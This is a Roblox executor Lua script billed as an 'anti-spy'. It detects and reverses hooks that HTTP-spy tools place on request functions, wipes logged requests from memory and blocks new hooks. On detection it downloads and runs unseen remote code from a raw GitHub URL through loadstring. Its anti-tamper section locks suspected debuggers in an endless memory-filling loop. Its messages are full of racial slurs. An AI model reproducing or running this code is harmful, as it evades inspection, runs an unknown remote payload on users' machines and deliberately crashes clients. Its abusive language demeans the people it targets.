if getgenv().AntiSpyLoaded then return end
getgenv().AntiSpyLoaded = true

local HttpService = game:GetService("HttpService")
local detected = false
local deb = false

local function log(msg)
warn("[ANTI-SPY] " .. msg)
end

local function punishment()
if deb then return end
deb = true
print("Babageyus caught a nigger, get the fuck out retard")
loadstring(game:HttpGet("https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/punish.lua"))()
end

local realHookFunction = clonefunction(hookfunction)
local realHookMetamethod = clonefunction(hookmetamethod)

local originals = {}

local HTTP_METHODS = {
HttpGet = true,
HttpPost = true,
GetAsync = true,
PostAsync = true,
RequestAsync = true,
}

-- Deep collect upvalues to find original C closures
function deepCollect(fn, visited, depth)
local found = {}
if depth > 6 or type(fn) ~= "function" then return found end
if visited[fn] then return found end
visited[fn] = true

local function process(v)
if type(v) == "function" then
found[v] = true
for f in pairs(deepCollect(v, visited, depth + 1)) do
found[f] = true
end
elseif type(v) == "table" and depth < 4 then
for _, tv in pairs(v) do
if type(tv) == "function" then
found[tv] = true
for f in pairs(deepCollect(tv, visited, depth + 2)) do
found[f] = true
end
end
end
end
end

pcall(function()
local ups = getupvalues(fn)
for _, v in pairs(ups) do process(v) end
end)
pcall(function()
for i = 1, 50 do
local name, val = debug.getupvalue(fn, i)
if not name then break end
process(val)
end
end)
return found
end

function recoverOriginal(fn, name)
if type(fn) ~= "function" then return nil, false end
local hooked = islclosure(fn)

local restored
pcall(function() restored = getoriginalfunction(fn) end)
if restored and type(restored) == "function" and iscclosure(restored) then
if hooked then log("Recovered " .. name .. " via getoriginalfunction") end
pcall(function() realHookFunction(fn, restored) end)
return restored, hooked
end

local dummy = newcclosure(function() end)
local prev
pcall(function() prev = realHookFunction(fn, dummy) end)
if not prev then
pcall(function() realHookFunction(fn, fn) end)
return clonefunction(fn), hooked
end

if islclosure(prev) then
hooked = true
log("Detected hook on " .. name)
local allFns = deepCollect(prev, {}, 0)
for f in pairs(allFns) do
if iscclosure(f) then
realHookFunction(fn, f)
return f, true
end
end
local cl = clonefunction(prev)
if cl and iscclosure(cl) then
realHookFunction(fn, cl)
return cl, true
end
realHookFunction(fn, prev)
return prev, true
end

realHookFunction(fn, prev)
return prev, hooked
end

local anyHooked = false

local httpFunctions = {
{game.HttpGet, "HttpGet"},
{game.HttpPost, "HttpPost"},
{HttpService.GetAsync, "GetAsync"},
{HttpService.PostAsync, "PostAsync"},
{HttpService.RequestAsync, "RequestAsync"},
}
for _, m in ipairs(httpFunctions) do
local orig, hooked = recoverOriginal(m[1], m[2])
originals[m[2]] = orig
if hooked then anyHooked = true end
end

-- Restore global request functions
if request then
local orig, hooked = recoverOriginal(request, "request")
originals.request = orig
if hooked then anyHooked = true end
getgenv().request = orig
end
if http_request then
local orig, hooked = recoverOriginal(http_request, "http_request")
originals.http_request = orig
if hooked then anyHooked = true end
end
if syn and syn.request then
local orig, hooked = recoverOriginal(syn.request, "syn.request")
originals.syn_request = orig
if hooked then anyHooked = true end
end

local rawMt = getrawmetatable(game)
local originalNc = nil
local ncDummy = newcclosure(function() end)
local prevNc
pcall(function() prevNc = realHookMetamethod(game, "__namecall", ncDummy) end)
if prevNc then
if islclosure(prevNc) then
anyHooked = true
log("Detected spy hook on __namecall")
for f in pairs(deepCollect(prevNc, {}, 0)) do
if iscclosure(f) then
originalNc = f
break
end
end
if not originalNc then originalNc = clonefunction(prevNc) end
else
originalNc = prevNc
end
elseif rawMt then
originalNc = rawMt.__namecall
end

if anyHooked then
detected = true
log("HTTP SPY DETECTED - hooks neutralized")
punishment()
end

function cleanupSpyData()
pcall(function()
for _, obj in pairs(getgc(true)) do
if type(obj) == "table" then
pcall(function()
local first = rawget(obj, 1)
if type(first) == "table" then
local url = rawget(first, "Url") or rawget(first, "url")
local method = rawget(first, "Method") or rawget(first, "method")
if type(url) == "string" and type(method) == "string" then
for i = #obj, 1, -1 do rawset(obj, i, nil) end
end
end
end)
end
end
end)
end

task.spawn(function()
while task.wait(3) do
cleanupSpyData()
end
end)

-- Permanent __namecall handler
local ncHandler = newcclosure(function(self, ...)
local method = getnamecallmethod()
if HTTP_METHODS[method] and originals[method] then
return originals[method](self, ...)
end
if originalNc then
return originalNc(self, ...)
end
end)

pcall(function() realHookMetamethod(game, "__namecall", ncHandler) end)
pcall(function()
local mt = getrawmetatable(game)
setreadonly(mt, false)
mt.__namecall = ncHandler
setreadonly(mt, true)
end)

realHookFunction(hookfunction, newcclosure(function(target, hook)
local isProtected = false
for name, func in pairs(originals) do
if target == func or target == game[name] or target == HttpService[name] then
isProtected = true
break
end
end
if isProtected then
log("BLOCKED hookfunction on HTTP function")
punishment()
return target
end
return realHookFunction(target, hook)
end))

-- Safe HTTP wrappers for your script
local safeRequest = originals.request or originals.http_request or originals.syn_request

function safeGet(url, headers)
if not safeRequest then return nil, 0 end
local ok, res = pcall(safeRequest, {
Url = url,
Method = "GET",
Headers = headers or {}
})
if ok and res then return res.Body, res.StatusCode end
return nil, 0
end

function safePost(url, body, headers)
if not safeRequest then return nil, 0 end
local ok, res = pcall(safeRequest, {
Url = url,
Method = "POST",
Headers = headers or {["Content-Type"] = "application/json"},
Body = body
})
if ok and res then return res.Body, res.StatusCode end
return nil, 0
end

getgenv().safeGet = safeGet
getgenv().safePost = safePost

log("ok")

do
local rayzValid = true
local rayzErr = function(msg)
print("Babageyus: " .. (msg or "you got fucked"))
while true do

local a = {}
for i = 1, 1e6 do a[i] = i end
end
end

if not pcall(function() end) then
rayzErr("debugger detected you dumb fuck")
end

if _VERSION ~= "Luau" then
rayzErr("fake roblox environment detected nigger")
end

local s = 0
local ready = nil
task.delay(2, function() s = s + 1; ready = true end)
task.wait(2.5)
if ready and s > 1 then
rayzErr("task.delay broken - you're being spied on")
end

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0, 0, 0, 0)
local changed = 0
frame:GetPropertyChangedSignal("Position"):Connect(function() changed = changed + 1 end)
local tw = game:GetService("TweenService"):Create(frame, TweenInfo.new(0.01), {Position = UDim2.fromScale(1, 1)})
tw:Play()
tw.Completed:Wait()
if changed == 0 or changed > 2 then
rayzErr("tween broken - not real roblox you broke ass nigga")
end

local v3 = Vector3.one
for i = 1, 50 do
local n = math.random(1, 67)
if v3 * n ~= Vector3.new(n, n, n) then
rayzErr("vector3 math failed - emulator detected")
end
end

if rayzValid then
print("Babageyus anti-tamper passed - you're clean for now")
else
rayzErr("anti-tamper failed - get the fuck out")
end
end
